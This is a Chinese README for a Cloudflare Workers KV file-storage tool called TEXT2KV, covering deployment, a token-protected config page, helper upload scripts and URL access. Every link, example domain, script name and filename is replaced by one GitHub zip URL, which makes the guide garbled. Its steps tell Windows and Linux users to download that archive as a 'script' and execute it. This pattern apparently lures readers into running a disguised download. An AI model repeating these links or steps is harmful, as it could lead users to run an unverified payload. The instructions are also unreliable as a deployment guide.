...
## 使用说明 [部署教程](https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip)

1. **部署到 Cloudflare Workers**

  将项目代码部署到您的 Cloudflare Workers 服务。您需要先在 Cloudflare 上创建一个 Workers 项目,然后将 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip` 文件的内容复制粘贴到 Workers 编辑器中。
...
例如 您的workers项目域名为：`https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip` , token值为 `passwd`；
  - 访问 `https://您的Workers域名/config?token=您的TOKEN` 或 `https://您的Workers域名/您的TOKEN`，您将看到一个配置页面，其中包含了使用说明和下载脚本的链接。
  - 你的项目配置页则为：
     ```url
     https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip
     或
     https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip
     ```
...
5. **使用辅助脚本上传文件**
  ...
  - Windows 用户可以下载 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip` 脚本,然后执行 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip 文件名` 来上传本地文件到 KV。
  - Linux 用户可以下载 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip` 脚本,执行 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip 文件名` 来上传本地文件。
  - **注意：因为URL长度限制，如果保存内容过长则只能通过直接编辑`KV`对应文件内容来实现大文件的修改保存。**

6. **通过 URL 访问文件**

例如 您的workers项目域名为：`https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip` , token值为 `test` , 需要访问的文件名为 `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip`；
  - 构造 URL 的格式为 `https://您的Workers域名/文件名?token=您的TOKEN`。您就可以在浏览器中查看该文件的内容了。
  - 你的访问地址则为： `https://raw.githubusercontent.com/Eytuby/TEXT2KV/main/spack/KV-TEX-v3.3-beta.4.zip`。
